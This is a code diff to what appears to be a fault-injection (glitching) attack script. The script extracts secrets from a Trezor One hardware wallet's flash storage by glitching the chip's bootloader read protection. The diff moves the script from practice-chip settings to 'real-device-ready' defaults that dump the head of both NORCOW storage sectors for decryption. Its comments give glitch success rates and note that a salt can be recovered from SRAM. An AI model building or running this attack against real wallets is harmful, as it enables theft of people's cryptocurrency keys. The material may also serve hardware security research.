@@ -121,14 +121,26 @@ UART = find_ftdi()
 # addresses stay the same) and TARGETS regenerates. Cost scales linearly:
 # every extra 256 B chunk costs ~1 more successful flip (~1/1400 shots
 # each at 2026-10-28 rates) - budget the campaign accordingly.
-STORAGE_BASE, STORAGE_LEN = 0x08008000, 0x4000    # PRACTICE-chip values
-# storage chunks FIRST (all oracle-gated -> bankable by a single flip), then
-# uid/otp3 LAST (outside the oracle -> need cross-read/latch). This keeps non-
-# latching flips productive on storage instead of stalling on uid.
-_STORAGE = [('storage_0000', STORAGE_BASE, 256)] + \
-           [(f'storage_{i:04d}', STORAGE_BASE + 256 * i, 256)
-            for i in range(1, STORAGE_LEN // 256)]
-_EXTRA = [('uid', 0x1FFF7A10, 12), ('otp3', 0x1FFF7860, 32)]
+# Trezor One storage = 2 NORCOW sectors (legacy/memory.h): sector 2 @ 0x08008000
+# and sector 3 @ 0x0800C000, 16 KiB each, CONTIGUOUS -> 0x08008000-0x0800FFFF
+# (32 KiB). The ACTIVE sector (holding the secrets) can be EITHER; the other is
+# erased/backup. So DEFAULT covers BOTH sectors (real-device-ready) and, in
+# targeted mode, we grab the HEAD of EACH sector. For a single-sector practice
+# plant (e.g. chip-c) set G_STORAGE_LEN=0x4000. Same on 512KB/1MB parts
+# (sectors 0-4 identical); total flash size never affects these addresses.
+STORAGE_BASE = int(os.environ.get('G_STORAGE_BASE', '08008000'), 16)
+STORAGE_LEN  = int(os.environ.get('G_STORAGE_LEN', '8000'), 16)   # 32KB=both sectors
+SECTOR_LEN   = int(os.environ.get('G_SECTOR_LEN', '4000'), 16)    # 16KB NORCOW sector
+# Global 256-B chunk index (decimal) across the region: storage_0000=0x08008000,
+# storage_0064=0x0800C000 (sector-3 head). Names stay stable for G_RESUME.
+_STORAGE = [(f'storage_{i:04d}', STORAGE_BASE + 256 * i, 256)
+            for i in range(STORAGE_LEN // 256)]
+# uid/otp3 are refused at the Read Memory address stage even with the gate
+# glitched (15k shots/0, FINDINGS) AND the salt is recoverable from SRAM .bss
+# with no glitch -> G_EXTRA=0 drops them so farming doesn't stall on uncrackable
+# targets. Default 1 = keep (legacy behaviour).
+_EXTRA = ([('uid', 0x1FFF7A10, 12), ('otp3', 0x1FFF7860, 32)]
+          if os.environ.get('G_EXTRA', '1') == '1' else [])
 TARGETS = _STORAGE + _EXTRA
 
 # DEFAULT = TARGETED: grab only the pieces decryption needs. NORCOW (storage
@@ -146,7 +158,15 @@ if os.environ.get('G_FULL') == '1':
     pass                      # full 16 KB storage dump (mostly blank) + uid/otp3
 else:
     _n = int(os.environ.get('G_TARGETED_N', 5))
-    TARGETS = _STORAGE[:_n] + _EXTRA   # head chunks (the secrets) + uid/otp3
+    # grab the first _n chunks (the dict HEAD = secrets) of EVERY storage sector
+    # in the region - the active sector's head decrypts; an inactive/blank sector
+    # reads FF and is harmless. Covers whichever NORCOW sector is live on the
+    # real device.
+    _head = []
+    for _soff in range(0, STORAGE_LEN, SECTOR_LEN):
+        _c0 = _soff // 256
+        _head += _STORAGE[_c0:_c0 + _n]
+    TARGETS = _head + _EXTRA   # head chunks of each sector (+ uid/otp3)
 CUR = [TARGETS[0]]          # [(name, addr, nbytes)] - what the NEXT flip reads
 DONE = {}                   # name -> bytes collected this run (see G_RESUME)
 DUMP_DIR = None             # dumps/run_YYYYmmdd_HHMMSS/, set in main()
